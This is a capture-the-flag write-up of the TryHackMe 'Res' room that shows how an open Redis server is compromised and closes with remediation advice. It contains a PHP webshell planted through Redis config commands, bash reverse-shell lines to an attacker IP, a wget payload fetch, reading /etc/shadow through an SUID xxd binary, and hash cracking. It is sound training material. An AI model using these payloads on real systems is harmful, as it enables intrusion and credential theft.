<h1 align="center"><a href="https://tryhackme.com/room/res">TryHackMe Res Room</a></h1>

<h2 align="center"><a href="https://twitter.com/0xTas">Writeup By: 0xTas</a></h2>

<p align="center">
    <a href="https://tryhackme.com/p/0xTas">
        <img alt="0xTas TryHackMe Profile" src="https://tryhackme-badges.s3.amazonaws.com/0xTas.png"></a>  
</p>


<h3 align="center">11 June 2022</h3>

---

## Questions:


### Scan the machine, how many ports are open?

`nmap -vv -sC -sV -p- res.thm -oN nmap/full.log`

> Port 80 Open | Apache httpd 2.4.18 <br>
> Port 6397 Open | Redis key-value store 6.0.7

![Nmap Results](https://i.imgur.com/QysWoCt.png)

> Answer: 2

---

### What is the database management system installed on the server?

> Answer: Redis

---

### What version of the DBMS is running?

> Answer: 6.0.7

---

### Compromise the machine and locate user.txt:

Searching for redis 6.0.7 exploits, I came across [this resource](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis) from Hacktricks.

Using info from that page, I learned that I could interface with the redis server via netcat. <br>

`nc -vn $IP 6379`

The server accepts anonymous connections without authorization, nice.

From here I was able to view some general info with the INFO command: <br>
`INFO`

![Redis Server Info](https://i.imgur.com/wY67rBA.png)

This showed me that there weren't any actual databases set up, meaning I likely won't be leaking info from a database.

Lower down on that hacktricks page, I learned that I can potentially create a webshell if I know the webserver's root folder path.

The hacktricks book uses a phpinfo() payload, so I'll have to use a webshell payload that I already have saved in a file on my system.

Visiting the website, it is just an Apache 2 default page, which tells me the location of this directory right away. <br>
It's at /var/www/html

So, using netcat to interface with the Redis server, I run the following commands with a simple php webshell paylaod: <br>
> `config set dir /var/www/html` <br>
> +OK <br>
`config set dbfilename redis.php` <br>
> +OK <br>
`set test "<?php echo \"<pre>\" . shell_exec($_GET[\"cmd\"]) . \"</pre>\"; ?>"` <br>
> +OK <br>
`save` <br>
> +OK <br>

Now I can navigate to the new file I created at 'res.thm/redis.php' and start inputting commands. <br>

> `http://res.thm/redis.php?cmd=ls` <br>
> index.html <br>
> redis.php <br>

Success! Time to enumerate further. <br>
> `?cmd=ls /home` <br>
> vianka <br>
`?cmd=ls /home/vianka` <br>
> redis-stable <br>
> user.txt <br>
`?cmd=cat /home/vianka/user.txt` <br>

> Answer: thm{red1s_***********************}


---

### What is the local user account password?

I looked around the user vianka's home directory some more, but didn't find any other suspicious files or useful info.

At this point I thought it would be ideal to catch an actual shell on this server, so I tried a few things to accomplish this: <br>

`?cmd=bash -i >& /dev/tcp/myIP/7777 0>&1`

This didn't seem to work for me. Stderr doesn't get displayed either, so I'm running blind in that regard.

Next I tried echoing a bash reverse shell into a shell.sh file, but I couldn't get it to create the file using my webshell. <br>
`?cmd=echo "bash -i >& /dev/tcp/myIP/7777 0>&1" > shell.sh` <br>

Then I decided to check if I had access to wget: <br>
> `?cmd=which wget` <br>
> /bin/wget <br>

I do, so let me try to pull down a reverse shell file instead: <br>
`tas@kali$ python3 -m http.server` <br>

> `?cmd=wget http://myIP/shell.sh` <br>
> shell.sh

This works, so now I can try to run it and catch a shell: <br>
`tas@kali$ nc -lnvp 7777` <br>

`?cmd=/bin/bash shell.sh` <br>

And with that, *I'm in*.

The first thing I do is stabilize my shell with python (making sure I caught my revshell with bash, not zsh): <br>
`$ python3 -c 'import pty; pty.spawn("/bin/bash")'` <br>
    
Then I press ctrl+z to background my reverse shell. <br>
```
tas@kali$ stty raw -echo
tas@kali$ fg
# Pressing enter a couple of times..
```
And finally: <br>
`$ export TERM=xterm`

Now with my mostly stable shell, I continue enumerating for a bit, but nothing jumps out at me right away.

Thus, I decided to pull down a copy of [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS):
```
www-data@ubuntu$ cd /dev/shm && wget http://myIP/linpeas.sh

www-data@ubuntu$ chmod +x linpeas.sh

www-data@ubuntu$ ./linpeas.sh | tee output.log
```
Linpeas brings to my attention that the xxd binary is owned by root and has the SUID bit set.

![Linpeas Output](https://i.imgur.com/0CWRWgx.png)

Paying a visit to [GTFOBins](https://gtfobins.github.io/gtfobins/xxd/), I can see that this binary may allow me priveledged reads/writes.

![GTFOBins xxd page](https://i.imgur.com/xoYdwuI.png)

The current goal is the vianka user's password, so lets see if we can read /etc/shadow:
```
www-data@ubuntu$ LFILE=/etc/shadow
www-data@ubuntu$ xxd "$LFILE" | xxd -r
```

This works, I can see the vianka user's password hash. <br>

I can also cat out the /etc/passwd file to potentially crack the hash with JohnTheRipper: <br>
`www-data@ubuntu$ cat /etc/passwd`

I copied the contents of these files into two .txt files on my host machine and ran the following command to combine them: <br>
`tas@kali$ unshadow shdw.txt pswd.txt > vianka.txt`

Then I ran JohnTheRipper to crack the hashes: <br>
`tas@kali$ john vianka.txt --wordlist=/usr/share/wordlists/rockyou.txt`

![JohnTheRipper Results](https://i.imgur.com/gA94039.png)

The result was the plaintext password for the vianka user.

> Answer: b********1


---

### Escalate privileges and obtain root.txt

The first thing I do is switch users to the vianka user: <br>
`www-data@ubuntu$ su vianka`

Entering the password which I just cracked, this succeeds.

Next I check my sudo permissions with `sudo -l`, and it appears I can run all commands via sudo as vianka.

Then: <br>
`vianka@ubuntu$ sudo bash`

Entering the password: <br>
`root@ubuntu#` <br>

> `root@ubuntu# ls /root` <br>
> root.txt

`root@ubuntu# cat /root/root.txt`

> Answer: thm{xxd_***************}

---

## Analysis & Remediation


There were several different vulnerable misconfigurations that allowed me to gain total access to this webserver:

1. Insecure default Redis configuration which allowed unauthenticated DBMS server access.
2. Insecure default Apache2 configuration which leaked the webserver's root folder location.
3. xxd binary owned by root with SUID bit, a rather brazen misconfiguration given the capabilities of said binary.
4. Weak account password for user vianka, coupled with unrestricted sudo permissions.

Services like Redis which are vulnerable or insecure in their default configurations (weak, default, or nonexistant credentials)
should be properly configured before being exposed to the internet.
If the Redis server had not accepted my connection or commands without proper authentication, I would have needed to somehow find the
right credentials before being able to leak any info or preform the attack which resulted in RCE via a webshell.


While generally less severe on its own, the Apache2 default configuration also contributed to the exploitation of the server,
by openly displaying a critical piece of information that I needed in order to exploit the vulnerability in Redis (the webserver's root directory).

Of course, it is certainly possible to blindly try common webserver paths and /var/www/html would surely be one of an attacker's first guesses,
so in this case all we stand to gain from hiding this information is a little bit of security through obscurity. 
But, if we take that one step further and use an arbitrary root directory for our webserver configuration, 
we may actually succeed in preventing this sort of exploit, especially via automated systems which may use dictionaries of known/default root paths.


The real nail in the coffin on this server was the misconfiguration around the xxd binary.
Binaries owned by root that have the SUID bit set can often be recipies for disaster, 
and may throw any notion of permission or access control out the window, depending on their capabilities.

xxd in particular, with the configuration encountered on this server, was all I would have needed to take over the entire system.
I used it to leak the contents of the /etc/shadow file, and then cracked the hashes found there to preform a lateral movement,
but I could have just as easily used xxd to write my own root user into /etc/shadow and /etc/passwd, giving me both root access and persistence in one go.


The final security misconfiguration that I encountered on this server was the incredibly weak account credential in use by the vianka user.
Once I had that password hash, I was almost instantly able to crack it using JohnTheRipper, an incredibly standard tool.
Even if I did not have access to their password hash, having a shell on the server would allow me or any attacker to brute force `su vianka` attempts with
the same wordlist that I fed to JohnTheRipper, with just a bit of simple scripting required (although it would not have been quite as quick, efficient, or quiet).

Without any sort of fail2ban configuration for the `su` command (which this server did not have), compromising that account is almost a given when such a weak credential is in use.
Given that the vianka user account also had unrestricted access to root commands via sudo, this would have been another full-featured path to owning this server.


In summary, when configuring internet-facing servers or network equipment, it is always very important to make sure that none of the technologies in use are left in a vulnerable state.
Many services have weak default, or even nonexistant credentials in their default state, and we must take care to ensure that we replace these with strong credentials ASAP.
Weak credentials are also problematic when used for user accounts, because they may allow attackers easy access to the server via protocols like SSH.
Or in the case of this webserver, extraneous vulnerabilities may give attackers initial access, while weak user credentials support their efforts toward fully compromising the system.

---
